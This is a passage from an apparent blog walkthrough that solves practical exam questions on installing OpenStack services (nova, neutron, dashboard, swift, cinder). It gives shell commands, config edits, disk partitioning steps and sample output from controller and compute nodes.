</span></span><span class="line"><span class="cl">[root@controller bin]# ./iaas-install-placement.sh 
</span></span></code></pre></td></tr></table>
</div>
</div><p>After installation of placement, we should run <code>iaas-install-nova-controller.sh</code> script to install nova service in controller node:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[root@controller bin]# ./iaas-install-nova-controller.sh
</span></span></code></pre></td></tr></table>
</div>
</div><p>Then we should install nova service in compute node, but before that we should copy the public key of controller node to it.</p>
<p>So we run:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[root@compute ~]# ssh-copy-id root@controller
</span></span></code></pre></td></tr></table>
</div>
</div><p>Then run <code>iaas-install-nova-compute.sh</code>:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[root@compute ~]# cd /usr/local/bin/
</span></span><span class="line"><span class="cl">[root@compute bin]# ./iaas-install-nova-compute.sh 
</span></span></code></pre></td></tr></table>
</div>
</div><p>Installed!</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">+----+--------------+---------+------+---------+-------+------------+
</span></span><span class="line"><span class="cl">| ID | Binary       | Host    | Zone | Status  | State | Updated At |
</span></span><span class="line"><span class="cl">+----+--------------+---------+------+---------+-------+------------+
</span></span><span class="line"><span class="cl">|  6 | nova-compute | compute | nova | enabled | up    | None       |
</span></span><span class="line"><span class="cl">+----+--------------+---------+------+---------+-------+------------+
</span></span><span class="line"><span class="cl">Found 2 cell mappings.
</span></span><span class="line"><span class="cl">Skipping cell0 since it does not contain hosts.
</span></span><span class="line"><span class="cl">Getting computes from cell &#39;cell1&#39;: d955f2a9-ec41-4ea0-b72a-8f3c38977c2e
</span></span><span class="line"><span class="cl">Checking host mapping for compute host &#39;compute&#39;: c17f7c5c-5821-4891-b6ca-a6684b028db1
</span></span><span class="line"><span class="cl">Creating host mapping for compute host &#39;compute&#39;: c17f7c5c-5821-4891-b6ca-a6684b028db1
</span></span><span class="line"><span class="cl">Found 1 unmapped computes in cell: d955f2a9-ec41-4ea0-b72a-8f3c38977c2e
</span></span></code></pre></td></tr></table>
</div>
</div><p>Then run the check command in controller to verify if the nova service installed successfully!</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[root@controller bin]# source /etc/keystone/admin-openrc.sh 
</span></span><span class="line"><span class="cl">[root@controller bin]# openstack compute service list
</span></span></code></pre></td></tr></table>
</div>
</div><p>And you will see the hostname of compute node:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">+----+----------------+------------+----------+---------+-------+----------------------------+
</span></span><span class="line"><span class="cl">| ID | Binary         | Host       | Zone     | Status  | State | Updated At                 |
</span></span><span class="line"><span class="cl">+----+----------------+------------+----------+---------+-------+----------------------------+
</span></span><span class="line"><span class="cl">|  4 | nova-conductor | controller | internal | enabled | up    | 2023-05-06T03:14:27.000000 |
</span></span><span class="line"><span class="cl">|  5 | nova-scheduler | controller | internal | enabled | up    | 2023-05-06T03:14:28.000000 |
</span></span><span class="line"><span class="cl">|  6 | nova-compute   | compute    | nova     | enabled | up    | 2023-05-06T03:14:25.000000 |
</span></span><span class="line"><span class="cl">+----+----------------+------------+----------+---------+-------+----------------------------+
</span></span></code></pre></td></tr></table>
</div>
</div><p>Ok, now we should do the final operation, edit the file <code>/etc/nova/nova.conf</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[root@controller bin]# vim /etc/nova/nova.conf
</span></span></code></pre></td></tr></table>
</div>
</div><p>Just simply change <code>#vif_plugging_is_fatal=true</code> to <code>vif_plugging_is_fatal=false</code>, but we can use vim command quickly:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-vim" data-lang="vim"><span class="line"><span class="cl"><span class="p">:</span>%<span class="nx">s</span><span class="sr">/#vif_plugging_is_fatal=true/</span><span class="nx">vif_plugging_is_fatal</span><span class="p">=</span><span class="nx">false</span>/<span class="nx">g</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>And save it!</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-vim" data-lang="vim"><span class="line"><span class="cl"><span class="p">:</span><span class="nx">wq</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>So we solved a quiz again! Congratulations!</p>
<blockquote>
<h4 id="question-9-neutron-installation-05-points"><strong>[Question 9] Neutron Installation [0.5 points]</strong></h4>
<p>Using the provided scripts <code>iaas-install-neutron-controller.sh</code> and <code>iaas-install-neutron-compute.sh</code>, install the neutron service on the controller and compute nodes. After completion, submit the username, password, and IP address of the control node to the answer box.</p>
</blockquote>
<p>This quiz is easy, just run the scripts in each nodes:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[root@controller bin]# ./iaas-install-neutron-controller.sh 
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[root@compute bin]# ./iaas-install-neutron-compute.sh 
</span></span></code></pre></td></tr></table>
</div>
</div><p>Then the Neutron Service was installed successfully! Quiz Solved!</p>
<blockquote>
<h4 id="question-10-installation-of-doshboard-05-points"><strong>[Question 10] Installation of Doshboard [0.5 points]</strong></h4>
<p>Use the <code>iaas-install-dashboad.sh</code> script to install the dashboard service on the controller node. After installation, modify the Djingo data in the Dashboard to be stored in a file (this modification solves the problem of ALL-in-one snapshots not being accessible in other cloud platform dashboards). After completion, submit the username, password and IP address of the controller node to the answer box.</p>
</blockquote>
<p>Run <code>iaas-install-dashboad.sh</code> script:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[root@controller bin]# ./iaas-install-dashboard.sh 
</span></span></code></pre></td></tr></table>
</div>
</div><p>Edit the file <code>/etc/openstack-dashboard/local_settings</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[root@controller bin]# vim /etc/openstack-dashboard/local_settings
</span></span></code></pre></td></tr></table>
</div>
</div><p>Replace <code>SESSION_ENGINE = 'django.contrib.sessions.backends.cache'</code> to <code>SESSION_ENGINE = 'django.contrib.sessions.backends.file'</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-vim" data-lang="vim"><span class="line"><span class="cl"><span class="p">:</span>%<span class="nx">s</span><span class="sr">/SESSION_ENGINE = &#39;django.contrib.sessions.backends.cache&#39;/</span><span class="nx">SESSION_ENGINE</span> <span class="p">=</span> <span class="s1">&#39;django.contrib.sessions.backends.file&#39;</span>/<span class="nx">g</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Save the file:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-vim" data-lang="vim"><span class="line"><span class="cl"><span class="p">:</span><span class="nx">wq</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>And visit the Dashboard by browser</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://192.168.56.2/dashboard
</span></span></code></pre></td></tr></table>
</div>
</div><p>You will see the login page.</p>
<p></p>
<p>Login with username <code>admin</code> and password <code>000000</code>.</p>
<p></p>
<p>Then Dashboard was installed successfully.</p>
<blockquote>
<h4 id="question-11-swift-installation-05-points"><strong>[Question 11] Swift Installation [0.5 points]</strong></h4>
<p>Use the <code>iaas-install-swift-controller.sh</code> and <code>iaas-install-swift-compute.sh</code> scripts to install the Swift service on the control and compute nodes respectively. After installation, use a command to create a container named &ldquo;examcontainer&rdquo;, upload the <code>cirros-0.3.4-x86_64-disk.img</code> image to the &ldquo;examcontainer&rdquo; container, and set segment storage with a size of <code>10M</code> for each segment. Once completed, submit the username, password, and IP address of the control node to the answer box.</p>
</blockquote>
<p>At first we need to create partitions in compute node</p>
<p>We need to check the disks:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[root@compute bin]# fdisk -l
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Disk /dev/sda: 53.7 GB, 53687091200 bytes, 104857600 sectors
</span></span><span class="line"><span class="cl">Units = sectors of 1 * 512 = 512 bytes
</span></span><span class="line"><span class="cl">Sector size (logical/physical): 512 bytes / 512 bytes
</span></span><span class="line"><span class="cl">I/O size (minimum/optimal): 512 bytes / 512 bytes
</span></span><span class="line"><span class="cl">Disk label type: dos
</span></span><span class="line"><span class="cl">Disk identifier: 0x000d6c03
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   Device Boot      Start         End      Blocks   Id  System
</span></span><span class="line"><span class="cl">/dev/sda1   *        2048     2099199     1048576   83  Linux
</span></span><span class="line"><span class="cl">/dev/sda2         2099200   104857599    51379200   8e  Linux LVM
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Disk /dev/sdb: 21.5 GB, 21474836480 bytes, 41943040 sectors
</span></span><span class="line"><span class="cl">Units = sectors of 1 * 512 = 512 bytes
</span></span><span class="line"><span class="cl">Sector size (logical/physical): 512 bytes / 512 bytes
</span></span><span class="line"><span class="cl">I/O size (minimum/optimal): 512 bytes / 512 bytes
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Disk /dev/sdc: 3221 MB, 3221225472 bytes, 6291456 sectors
</span></span><span class="line"><span class="cl">Units = sectors of 1 * 512 = 512 bytes
</span></span><span class="line"><span class="cl">Sector size (logical/physical): 512 bytes / 512 bytes
</span></span><span class="line"><span class="cl">I/O size (minimum/optimal): 512 bytes / 512 bytes
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Disk /dev/mapper/centos-root: 48.4 GB, 48444211200 bytes, 94617600 sectors
</span></span><span class="line"><span class="cl">Units = sectors of 1 * 512 = 512 bytes
</span></span><span class="line"><span class="cl">Sector size (logical/physical): 512 bytes / 512 bytes
</span></span><span class="line"><span class="cl">I/O size (minimum/optimal): 512 bytes / 512 bytes
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Disk /dev/mapper/centos-swap: 4160 MB, 4160749568 bytes, 8126464 sectors
</span></span><span class="line"><span class="cl">Units = sectors of 1 * 512 = 512 bytes
</span></span><span class="line"><span class="cl">Sector size (logical/physical): 512 bytes / 512 bytes
</span></span><span class="line"><span class="cl">I/O size (minimum/optimal): 512 bytes / 512 bytes
</span></span></code></pre></td></tr></table>
</div>
</div><p>We&rsquo;ll get information below:</p>
<ul>
<li>
<p><code>/dev/sdb</code> is a disk with a size of 21.5 GB and no partitions.</p>
</li>
<li>
<p><code>/dev/sdc</code> is a disk with a size of 3221 MB (3.2 GB) and no partitions.</p>
</li>
</ul>
<p>We need create 2 partitions in <code>sdb</code>: <code>sdb1</code> and <code>sdb2</code></p>
<p><code>sdb1</code> for cinder and <code>sdb2</code> for swift.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[root@compute bin]# fdisk /dev/sdb
</span></span><span class="line"><span class="cl">Welcome to fdisk (util-linux 2.23.2).
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Changes will remain in memory only, until you decide to write them.
</span></span><span class="line"><span class="cl">Be careful before using the write command.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Device does not contain a recognized partition table
</span></span><span class="line"><span class="cl">Building a new DOS disklabel with disk identifier 0xe8f17fde.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Command (m for help): n
</span></span><span class="line"><span class="cl">Partition type:
</span></span><span class="line"><span class="cl">   p   primary (0 primary, 0 extended, 4 free)
</span></span><span class="line"><span class="cl">   e   extended
</span></span><span class="line"><span class="cl">Select (default p): p
</span></span><span class="line"><span class="cl">Partition number (1-4, default 1): 
</span></span><span class="line"><span class="cl">First sector (2048-41943039, default 2048): +10G
</span></span><span class="line"><span class="cl">Last sector, +sectors or +size{K,M,G} (20971520-41943039, default 41943039): 
</span></span><span class="line"><span class="cl">Using default value 41943039
</span></span><span class="line"><span class="cl">Partition 1 of type Linux and of size 10 GiB is set
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Command (m for help): n
</span></span><span class="line"><span class="cl">Partition type:
</span></span><span class="line"><span class="cl">   p   primary (1 primary, 0 extended, 3 free)
</span></span><span class="line"><span class="cl">   e   extended
</span></span><span class="line"><span class="cl">Select (default p): p
</span></span><span class="line"><span class="cl">Partition number (2-4, default 2): 
</span></span><span class="line"><span class="cl">First sector (2048-41943039, default 2048): 
</span></span><span class="line"><span class="cl">Using default value 2048
</span></span><span class="line"><span class="cl">Last sector, +sectors or +size{K,M,G} (2048-20971519, default 20971519): 
</span></span><span class="line"><span class="cl">Using default value 20971519
</span></span><span class="line"><span class="cl">Partition 2 of type Linux and of size 10 GiB is set
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Command (m for help): p
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Disk /dev/sdb: 21.5 GB, 21474836480 bytes, 41943040 sectors
</span></span><span class="line"><span class="cl">Units = sectors of 1 * 512 = 512 bytes
</span></span><span class="line"><span class="cl">Sector size (logical/physical): 512 bytes / 512 bytes
</span></span><span class="line"><span class="cl">I/O size (minimum/optimal): 512 bytes / 512 bytes
</span></span><span class="line"><span class="cl">Disk label type: dos
</span></span><span class="line"><span class="cl">Disk identifier: 0xe8f17fde
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   Device Boot      Start         End      Blocks   Id  System
</span></span><span class="line"><span class="cl">/dev/sdb1        20971520    41943039    10485760   83  Linux
</span></span><span class="line"><span class="cl">/dev/sdb2            2048    20971519    10484736   83  Linux
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Partition table entries are not in disk order
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Command (m for help): w
</span></span><span class="line"><span class="cl">The partition table has been altered!
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Calling ioctl() to re-read partition table.
</span></span><span class="line"><span class="cl">Syncing disks.
</span></span></code></pre></td></tr></table>
</div>
</div><p>Format the partitions:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[root@compute bin]# mkfs.ext4 /dev/sdb1
</span></span><span class="line"><span class="cl">mke2fs 1.42.9 (28-Dec-2013)
</span></span><span class="line"><span class="cl">Filesystem label=
</span></span><span class="line"><span class="cl">OS type: Linux
</span></span><span class="line"><span class="cl">Block size=4096 (log=2)
</span></span><span class="line"><span class="cl">Fragment size=4096 (log=2)
</span></span><span class="line"><span class="cl">Stride=0 blocks, Stripe width=0 blocks
</span></span><span class="line"><span class="cl">655360 inodes, 2621440 blocks
</span></span><span class="line"><span class="cl">131072 blocks (5.00%) reserved for the super user
</span></span><span class="line"><span class="cl">First data block=0
</span></span><span class="line"><span class="cl">Maximum filesystem blocks=2151677952
</span></span><span class="line"><span class="cl">80 block groups
</span></span><span class="line"><span class="cl">32768 blocks per group, 32768 fragments per group
</span></span><span class="line"><span class="cl">8192 inodes per group
</span></span><span class="line"><span class="cl">Superblock backups stored on blocks: 
</span></span><span class="line"><span class="cl">	32768, 98304, 163840, 229376, 294912, 819200, 884736, 1605632
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Allocating group tables: done                            
</span></span><span class="line"><span class="cl">Writing inode tables: done                            
</span></span><span class="line"><span class="cl">Creating journal (32768 blocks): done
</span></span><span class="line"><span class="cl">Writing superblocks and filesystem accounting information: done 
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[root@compute bin]# mkfs.ext4 /dev/sdb2
</span></span><span class="line"><span class="cl">mke2fs 1.42.9 (28-Dec-2013)
</span></span><span class="line"><span class="cl">Filesystem label=
</span></span><span class="line"><span class="cl">OS type: Linux
</span></span><span class="line"><span class="cl">Block size=4096 (log=2)
</span></span><span class="line"><span class="cl">Fragment size=4096 (log=2)
</span></span><span class="line"><span class="cl">Stride=0 blocks, Stripe width=0 blocks
</span></span><span class="line"><span class="cl">655360 inodes, 2621184 blocks
</span></span><span class="line"><span class="cl">131059 blocks (5.00%) reserved for the super user
</span></span><span class="line"><span class="cl">First data block=0
</span></span><span class="line"><span class="cl">Maximum filesystem blocks=2151677952
</span></span><span class="line"><span class="cl">80 block groups
</span></span><span class="line"><span class="cl">32768 blocks per group, 32768 fragments per group
</span></span><span class="line"><span class="cl">8192 inodes per group
</span></span><span class="line"><span class="cl">Superblock backups stored on blocks: 
</span></span><span class="line"><span class="cl">	32768, 98304, 163840, 229376, 294912, 819200, 884736, 1605632
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Allocating group tables: done                            
</span></span><span class="line"><span class="cl">Writing inode tables: done                            
</span></span><span class="line"><span class="cl">Creating journal (32768 blocks): done
</span></span><span class="line"><span class="cl">Writing superblocks and filesystem accounting information: done 
</span></span></code></pre></td></tr></table>
</div>
</div><p>Then run <code>iaas-install-swift-controller.sh</code> and <code>iaas-install-swift-compute.sh</code> scripts:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[root@controller bin]# ./iaas-install-swift-controller.sh 
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[root@compute bin]# ./iaas-install-swift-compute.sh 
</span></span></code></pre></td></tr></table>
</div>
</div><p>Back to <code>/root</code> directory(Or other location of <code>cirros-0.3.4-x86_64-disk.img</code>):</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[root@controller bin]# cd ~
</span></span></code></pre></td></tr></table>
</div>
</div><p>Create a container named <code>examcontainer</code>:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[root@controller ~]# swift post examcontainer
</span></span></code></pre></td></tr></table>
</div>
</div><p>Upload the cirros-0.3.4-x86_64-disk.img image to the “examcontainer” container, and set segment storage with a size of 10M for each segment.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[root@controller ~]# swift upload examcontainer -S 10000000 cirros-0.3.4-x86_64-disk.img 
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cirros-0.3.4-x86_64-disk.img segment 1
</span></span><span class="line"><span class="cl">cirros-0.3.4-x86_64-disk.img segment 0
</span></span><span class="line"><span class="cl">cirros-0.3.4-x86_64-disk.img
</span></span></code></pre></td></tr></table>
</div>
</div><p>Then it&rsquo;s finished.</p>
<blockquote>
<h4 id="question-12-creating-a-cinder-volume-05-points"><strong>[Question 12] Creating a Cinder volume [0.5 points]</strong></h4>
<p>Using the <code>iaas-install-cinder-controller.sh</code> and <code>iaas-install-cinder-compute.sh</code> scripts, install the Cinder service on both the control node and compute node. On the compute node, expand the block storage by creating an additional 5GB partition and adding it to the back-end storage for Cinder block storage. After completion, submit the username, password, and IP address of the compute node to the answer box.</p>
</blockquote>
<p>Install the Cinder Service in controller node:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[root@controller bin]# ./iaas-install-cinder-controller.sh
</span></span></code></pre></td></tr></table>
</div>
</div><p>Install the Cinder Service in compute node:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[root@compute bin]# ./iaas-install-cinder-compute.sh 
</span></span></code></pre></td></tr></table>
</div>
</div><p>Check if succeed:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[root@compute bin]# lsblk
</span></span><span class="line"><span class="cl">NAME                                            MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
</span></span><span class="line"><span class="cl">sda                                               8:0    0   50G  0 disk 
</span></span><span class="line"><span class="cl">├─sda1                                            8:1    0    1G  0 part /boot
</span></span><span class="line"><span class="cl">└─sda2                                            8:2    0   49G  0 part 
</span></span><span class="line"><span class="cl">  ├─centos-root                                 253:0    0 45.1G  0 lvm  /
</span></span><span class="line"><span class="cl">  └─centos-swap                                 253:1    0  3.9G  0 lvm  [SWAP]
